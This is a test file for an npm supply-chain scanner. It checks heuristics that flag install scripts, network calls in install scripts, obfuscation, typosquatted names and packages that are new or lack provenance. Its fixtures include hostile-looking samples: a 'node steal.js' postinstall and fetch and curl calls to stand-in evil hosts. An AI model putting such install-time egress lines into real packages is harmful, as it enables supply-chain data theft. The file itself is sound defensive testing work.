import { test } from "node:test";
import assert from "node:assert/strict";

import { installScript } from "../src/heuristics/install-script.ts";
import { egressInInstall } from "../src/heuristics/egress-in-install.ts";
import { obfuscation } from "../src/heuristics/obfuscation.ts";
import { typosquat } from "../src/heuristics/typosquat.ts";
import { youngVersion } from "../src/heuristics/young-version.ts";
import { noProvenance } from "../src/heuristics/no-provenance.ts";
import type { PackageContext } from "../src/heuristics/types.ts";
import type { ResolvedPackage } from "../src/deptree.ts";

function pkg(overrides: Partial<ResolvedPackage> = {}): ResolvedPackage {
  return {
    name: "evil-pkg",
    version: "1.0.0",
    id: "evil-pkg@1.0.0",
    dir: "/tmp/evil-pkg",
    installPath: "node_modules/evil-pkg",
    hasInstallScript: true,
    isDirect: false,
    optional: false,
    ...overrides,
  };
}

function ctx(overrides: Partial<PackageContext> = {}): PackageContext {
  return { pkg: pkg(), scripts: {}, installScriptSource: "", ...overrides };
}

test("installScript: transitive dep with postinstall is high severity", () => {
  const findings = installScript(ctx({ scripts: { postinstall: "node steal.js" } }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "high");
});

test("installScript: direct dep with postinstall is only medium", () => {
  const findings = installScript(
    ctx({ pkg: pkg({ isDirect: true }), scripts: { postinstall: "node build.js" } }),
  );
  assert.equal(findings[0].severity, "medium");
});

test("installScript: no scripts, no findings", () => {
  assert.deepEqual(installScript(ctx()), []);
});

test("egressInInstall: flags fetch/curl in install script source", () => {
  assert.equal(egressInInstall(ctx({ installScriptSource: 'fetch("https://evil.example.com")' })).length, 1);
  assert.equal(egressInInstall(ctx({ installScriptSource: "curl http://x.example.com" })).length, 1);
});

test("egressInInstall: benign script produces nothing", () => {
  assert.deepEqual(egressInInstall(ctx({ installScriptSource: "console.log('hi')" })), []);
});

test("egressInInstall: does not flag a URL that only appears in a comment", () => {
  const source = [
    "// see https://github.com/example/pkg for docs",
    "/* homepage: https://example.com */",
    "console.log('build ok')",
  ].join("\n");
  assert.deepEqual(egressInInstall(ctx({ installScriptSource: source })), []);
});

test("egressInInstall: still flags a real call after stripping a comment", () => {
  const source = ["// see https://github.com/example/pkg for docs", 'fetch("https://evil.example.com")'].join(
    "\n",
  );
  assert.equal(egressInInstall(ctx({ installScriptSource: source })).length, 1);
});

test("obfuscation: flags eval and dense hex escapes", () => {
  assert.equal(obfuscation(ctx({ installScriptSource: 'eval("1+1")' })).length, 1);
  assert.equal(
    obfuscation(ctx({ installScriptSource: "\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48" })).length,
    1,
  );
});

test("obfuscation: clean source produces nothing", () => {
  assert.deepEqual(obfuscation(ctx({ installScriptSource: "console.log('build ok')" })), []);
});

test("typosquat: flags a one-edit-distance name against the popular list", () => {
  const findings = typosquat(ctx({ pkg: pkg({ name: "lodahs", id: "lodahs@1.0.0" }) }));
  assert.equal(findings.length, 1);
  assert.match(findings[0].detail, /lodash/);
});

test("typosquat: the real popular package itself is not flagged", () => {
  assert.deepEqual(typosquat(ctx({ pkg: pkg({ name: "lodash", id: "lodash@4.17.21" }) })), []);
});

test("typosquat: an unrelated name is not flagged", () => {
  assert.deepEqual(typosquat(ctx({ pkg: pkg({ name: "my-internal-tool" }) })), []);
});

test("youngVersion: fails open when registry metadata absent", () => {
  assert.deepEqual(youngVersion(ctx({ registry: undefined })), []);
});

test("youngVersion: flags a version published hours ago", () => {
  const findings = youngVersion(
    ctx({ registry: { publishedAt: new Date(Date.now() - 3600_000).toISOString() } }),
  );
  assert.equal(findings.length, 1);
});

test("youngVersion: does not flag a version published a year ago", () => {
  assert.deepEqual(
    youngVersion(ctx({ registry: { publishedAt: new Date(Date.now() - 365 * 86400_000).toISOString() } })),
    [],
  );
});

test("noProvenance: fails open when registry metadata absent", () => {
  assert.deepEqual(noProvenance(ctx({ registry: undefined })), []);
});

test("noProvenance: flags missing provenance, not present provenance", () => {
  assert.equal(noProvenance(ctx({ registry: { hasProvenance: false } })).length, 1);
  assert.deepEqual(noProvenance(ctx({ registry: { hasProvenance: true } })), []);
});
